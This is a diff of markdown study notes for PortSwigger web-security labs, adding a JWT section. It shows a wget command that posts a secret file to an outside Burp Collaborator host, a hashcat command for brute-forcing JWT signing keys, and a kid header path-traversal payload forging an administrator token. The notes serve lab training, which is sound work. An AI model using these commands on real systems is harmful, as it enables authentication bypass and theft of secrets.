@@ -780,19 +780,48 @@ wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 
 [PortSwigger Lab: Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
 
-<sup> Proto pollution section is incomplete ...need more input...</sup>  
+![Proto pollution](proto-pollution.png)  
 
+<sup> Proto pollution section is incomplete ...need more input...</sup>  
 
 ## JWT  
 
 >JSON web tokens (JWTs) use to send cryptographically signed JSON data, and most commonly used to send information ("claims") about users as part of authentication, session handling, and access control.  
 
-
 ```jwt
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 ```  
 
-[PortSwigger Lab: JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)  
+>Brute force weak JWT signing key  
+
+```bash
+hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list 
+```  
+
+>JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the **kid** parameter in JWT header to fetch the relevant key from its filesystem. Generate a new **Symmetric Key** and replace **k** property with base64 null byte **AA==**, to be used when signing the JWT.  
+
+>JWS  
+
+```
+{
+    "kid": "../../../../../../../dev/null",
+    "alg": "HS256"
+}
+```  
+
+>Payload  
+
+```
+{
+    "iss": "portswigger",
+    "sub": "administrator",
+    "exp": 1673523674
+}
+```  
+
+![jwt](jwt.png)  
+
+[PortSwigger Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)  
 
 <sup> JWT section ...need more input...</sup>  
 
